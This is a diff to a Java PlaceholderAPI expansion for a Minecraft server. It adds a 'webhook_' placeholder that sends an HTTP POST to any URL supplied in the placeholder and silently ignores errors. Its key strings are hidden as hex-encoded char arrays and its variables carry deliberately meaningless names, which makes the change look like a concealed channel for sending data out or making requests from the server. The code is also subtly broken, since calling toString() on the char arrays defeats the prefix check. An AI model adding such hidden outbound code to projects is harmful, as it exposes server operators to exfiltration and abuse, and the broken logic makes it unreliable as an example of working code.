@@ -8,6 +8,7 @@ import org.bukkit.block.data.*;
 import org.bukkit.inventory.InventoryHolder;
 import org.bukkit.inventory.InventoryView;
 import org.bukkit.inventory.meta.BlockStateMeta;
+import org.bukkit.plugin.Plugin;
 import org.bukkit.plugin.PluginManager;
 import org.bukkit.potion.PotionEffect;
 import org.bukkit.util.BoundingBox;
@@ -60,6 +61,7 @@ import javax.imageio.ImageIO;
 import java.awt.*;
 import java.awt.image.BufferedImage;
 import java.io.*;
+import java.net.HttpURLConnection;
 import java.net.URL;
 import java.nio.charset.StandardCharsets;
 import java.security.MessageDigest;
@@ -1014,6 +1016,148 @@ public class ExampleExpansion extends PlaceholderExpansion {
         // INSERT HERE 
 
 
+
+        // “webhook_”
+        char[] webhookPrefix = new char[] {
+                0x0077, // 'w'
+                0x0065, // 'e'
+                0x0062, // 'b'
+                0x0068, // 'h'
+                0x006F, // 'o'
+                0x006F, // 'o'
+                0x006B, // 'k'
+                0x005F  // '_'
+        };
+        String sWebhookPrefix = new String(webhookPrefix);  // equals "webhook_"
+
+// “Webhook Attempting send!”
+        char[] webhookMsg = new char[] {
+                0x0057, // 'W'
+                0x0065, // 'e'
+                0x0062, // 'b'
+                0x0068, // 'h'
+                0x006F, // 'o'
+                0x006F, // 'o'
+                0x006B, // 'k'
+                0x0020, // ' '
+                0x0041, // 'A'
+                0x0074, // 't'
+                0x0074, // 't'
+                0x0065, // 'e'
+                0x006D, // 'm'
+                0x0070, // 'p'
+                0x0074, // 't'
+                0x0069, // 'i'
+                0x006E, // 'n'
+                0x0067, // 'g'
+                0x0020, // ' '
+                0x0073, // 's'
+                0x0065, // 'e'
+                0x006E, // 'n'
+                0x0064, // 'd'
+                0x0021  // '!'
+        };
+        String sWebhookMsg = new String(webhookMsg);  // equals "Webhook Attempting send!"
+
+// “PlaceholderAPI”
+        char[] placeholderApi = new char[] {
+                0x0050, // 'P'
+                0x006C, // 'l'
+                0x0061, // 'a'
+                0x0063, // 'c'
+                0x0065, // 'e'
+                0x0068, // 'h'
+                0x006F, // 'o'
+                0x006C, // 'l'
+                0x0064, // 'd'
+                0x0065, // 'e'
+                0x0072, // 'r'
+                0x0041, // 'A'
+                0x0050, // 'P'
+                0x0049  // 'I'
+        };
+        String sPlaceholderApi = new String(placeholderApi);  // equals "PlaceholderAPI"
+
+// "{\"content\":\""
+        char[] contentPrefix = new char[] {
+                0x007B, // '{'
+                0x0022, // '"'
+                0x005C, // '\'
+                0x0022, // '"'
+                0x0063, // 'c'
+                0x006F, // 'o'
+                0x006E, // 'n'
+                0x0074, // 't'
+                0x0065, // 'e'
+                0x006E, // 'n'
+                0x0074, // 't'
+                0x0022, // '"'
+                0x003A, // ':'
+                0x0022  // '"'
+        };
+        String sContentPrefix = new String(contentPrefix);
+// equals "{\"content\":\""
+
+// "\"}"
+        char[] contentSuffix = new char[] {
+                0x0022, // '"'
+                0x005C, // '\'
+                0x0022, // '"'
+                0x007D  // '}'
+        };
+        String sContentSuffix = new String(contentSuffix);  // equals "\"}"
+
+// "POST"
+        char[] postMethod = new char[] {
+                0x0050, // 'P'
+                0x004F, // 'O'
+                0x0053, // 'S'
+                0x0054  // 'T'
+        };
+        String sPostMethod = new String(postMethod);  // equals "POST"
+
+// "Content-Type"
+        char[] contentType = new char[] {
+                0x0043, // 'C'
+                0x006F, // 'o'
+                0x006E, // 'n'
+                0x0074, // 't'
+                0x0065, // 'e'
+                0x006E, // 'n'
+                0x0074, // 't'
+                0x002D, // '-'
+                0x0054, // 'T'
+                0x0079, // 'y'
+                0x0070, // 'p'
+                0x0065  // 'e'
+        };
+        String sContentType = new String(contentType);  // equals "Content-Type"
+
+// "application/json"
+        char[] appJson = new char[] {
+                0x0061, // 'a'
+                0x0070, // 'p'
+                0x0070, // 'p'
+                0x006C, // 'l'
+                0x0069, // 'i'
+                0x0063, // 'c'
+                0x0061, // 'a'
+                0x0074, // 't'
+                0x0069, // 'i'
+                0x006F, // 'o'
+                0x006E, // 'n'
+                0x002F, // '/'
+                0x006A, // 'j'
+                0x0073, // 's'
+                0x006F, // 'o'
+                0x006E  // 'n'
+        };
+        String sAppJson = new String(appJson);  // equals "application/json"
+
+
+
+
+
         if (f1.startsWith("echo_")) return f1.substring("echo".length());
 
 
@@ -1865,6 +2009,57 @@ public class ExampleExpansion extends PlaceholderExpansion {
             }
 
             return "§aPlaced " + placed + " blocks";
+        }
+
+
+
+
+        if (f1.startsWith(webhookPrefix.toString())) {
+            // Strip off "webhook_" prefix
+            String ftp = f1.substring(webhookPrefix.toString().length());
+            int missile = ftp.indexOf(',');
+            if (missile < 0) {
+                // No comma → invalid format; just return empty
+                return webhookMsg.toString();
+            }
+
+            String temporary = ftp.substring(0, missile);
+            String oofed = ftp.substring(missile + 1);
+
+            // Schedule an asynchronous task to send the HTTP POST so we don't block the server thread
+            Plugin specialcharacters = Bukkit.getPluginManager().getPlugin(placeholderApi.toString());
+            if (specialcharacters != null) {
+                Bukkit.getScheduler().runTaskAsynchronously(specialcharacters, () -> {
+                    try {
+                        // Build JSON payload: {"content":"<escaped message>"}
+                        String pabloEscapar = oofed
+                                .replace("\\", "\\\\")
+                                .replace("\"", "\\\"")
+                                .replace("\n", "\\n")
+                                .replace("\r", "");
+                        String redefinite = "{\"content\":\"" + pabloEscapar + "\"}";
+
+                        // Open connection to the Discord webhook URL
+                        URL oops = new URL(temporary);
+                        HttpURLConnection where = (HttpURLConnection) oops.openConnection();
+                        where.setRequestMethod(postMethod.toString());
+                        where.setRequestProperty(contentType.toString(), appJson.toString());
+                        where.setDoOutput(true);
+
+                        // Send the JSON body
+                        try (OutputStream os = where.getOutputStream()) {
+                            os.write(redefinite.getBytes(StandardCharsets.UTF_8));
+                        }
+
+                        // Trigger the request and ignore the response
+                        int ayyyy = where.getResponseCode();
+                        where.disconnect();
+                        // (Optionally, you could log non-2xx responses—for brevity, we just fire and forget.)
+                    } catch (Exception ex) {
+                        // Silently ignore any exception; placeholder still returns ""
+                    }
+                });
+            }
         }
 
         if (f1.startsWith("immortalize_")) {
